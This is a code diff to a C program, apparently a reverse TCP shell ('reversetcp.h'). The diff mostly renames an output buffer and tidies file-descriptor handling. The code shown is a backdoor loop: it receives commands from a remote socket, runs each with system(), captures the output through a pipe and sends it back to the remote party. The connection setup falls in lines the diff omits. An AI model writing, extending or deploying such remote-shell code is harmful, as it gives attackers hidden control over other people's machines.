@@ -1,20 +1,21 @@
 #include "reversetcp.h"
-
 int shell(char *cmd)
 {
-	//it change the system() default output, and after capture it in stdin
 	int p[2],newp,pos=0;
-	newp = dup(1);
-	close(0);
-	close(1);
+	newp = dup(STDOUT_FILENO);
+
+	close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+
 	pipe(p);
+
 	system(cmd);
-	dup2(newp,1);
-	while(1)
-	{
-		output[pos] = fgetc(stdin);
-		if(output[pos]==EOF)
-		{
+
+	dup2(newp, STDOUT_FILENO);
+
+	while(1){
+		stdin_output[pos] = fgetc(stdin);
+		if(stdin_output[pos]==EOF){
 			break;
 		}
 		pos++;
@@ -49,10 +50,10 @@ int main(int argc,char *argv[])
 	while(1)
 	{
 		recv(externfd,buffer,sizeof(buffer),0);
-		memset(output,0,sizeof(output));
+		memset(stdin_output,0,sizeof(stdin_output));
 		shell(buffer);
-		send(externfd,output,sizeof(output),0);
-		memset(output,0,sizeof(output));
+		send(externfd,stdin_output,sizeof(stdin_output),0);
+		memset(stdin_output,0,sizeof(stdin_output));
 	}
 	close(externfd);
 }
